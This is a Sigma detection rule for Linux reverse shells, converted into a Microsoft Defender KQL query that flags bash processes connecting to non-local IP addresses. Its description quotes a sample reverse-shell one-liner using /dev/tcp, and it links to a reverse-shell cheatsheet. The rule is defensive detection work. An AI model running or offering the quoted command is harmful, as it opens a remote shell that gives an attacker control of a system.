// Title: Linux Reverse Shell Indicator
// Sigma ID: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
// Status: test | Level: critical
// Author: Florian Roth (Nextron Systems)
// Date: 2021-10-16 | Modified: 2022-12-25
// ATT&CK: execution, T1059.004
// Description: Detects a bash contecting to a remote IP address (often found when actors do something like
//   'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
// False positives:
//   - Unknown
// References:
//   - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
// Sigma rule: https://github.com/SigmaHQ/sigma/blob/adf5a626c4a776f3f023056f0f398b9523a2f09e/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml
// License: Detection Rule License (DRL) 1.1 - https://github.com/SigmaHQ/Detection-Rule-License
// Converted by sigma2kql (target: microsoft_xdr, pySigma 1.5.1, pySigma-backend-kusto 1.0.1)
// Validation: passed (Kusto.Language 12.4.1, live Defender schema)
// Machine-generated and not tested against real telemetry. Verify before use as a detection.

DeviceNetworkEvents
| where InitiatingProcessFolderPath endswith "/bin/bash" and (not((RemoteIP in~ ("127.0.0.1", "0.0.0.0"))))
